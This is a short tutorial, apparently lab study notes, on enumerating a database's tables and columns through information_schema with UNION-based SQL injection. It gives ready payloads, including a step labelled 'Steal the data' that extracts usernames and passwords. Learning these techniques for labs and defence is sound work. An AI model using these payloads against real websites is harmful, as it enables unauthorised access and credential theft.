## Listing Database Contents – Simple Explanation

This is how you **map out an entire database** you don't know.

---

## The Information Schema

Every database (except Oracle) has built-in views that tell you **everything** about the database structure.

| View | What it shows |
|------|---------------|
| `information_schema.tables` | All table names |
| `information_schema.columns` | All column names for each table |

---

## Step 1: List All Tables

**Query:**
```sql
SELECT * FROM information_schema.tables
```

**What comes back:**

| TABLE_NAME | TABLE_TYPE |
|------------|-------------|
| Products | BASE TABLE |
| Users | BASE TABLE |
| Feedback | BASE TABLE |
| Orders | BASE TABLE |

**As a UNION injection (2 columns):**
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables --
```

---

## Step 2: List Columns for a Specific Table

**Query (for Users table):**
```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

**What comes back:**

| TABLE_NAME | COLUMN_NAME | DATA_TYPE |
|------------|-------------|------------|
| Users | UserId | int |
| Users | Username | varchar |
| Users | Password | varchar |
| Users | Email | varchar |

**As a UNION injection (2 columns):**
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users' --
```

---

## Complete Hacker Workflow

```
Step 1: Find all tables
' UNION SELECT table_name, NULL FROM information_schema.tables --
    ↓
Result: Users, Products, Orders, Feedback
    ↓
Step 2: Pick a juicy table (Users)
    ↓
Step 3: Find columns in Users
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users' --
    ↓
Result: UserId, Username, Password, Email
    ↓
Step 4: Steal the data
' UNION SELECT Username, Password FROM Users --
```

---

## Oracle Alternative

Oracle doesn't have `information_schema`. Use these instead:

| What to find | Oracle query |
|--------------|---------------|
| All tables | `SELECT table_name FROM all_tables` |
| All columns | `SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS'` |

---

## What the Output Looks Like in a Lab

When you inject these queries, the table and column names appear **right in the webpage response** – often in a product list, search results, or error message.

---

## One Sentence Summary

Query `information_schema.tables` to find all table names, then `information_schema.columns` to find all column names – then steal everything.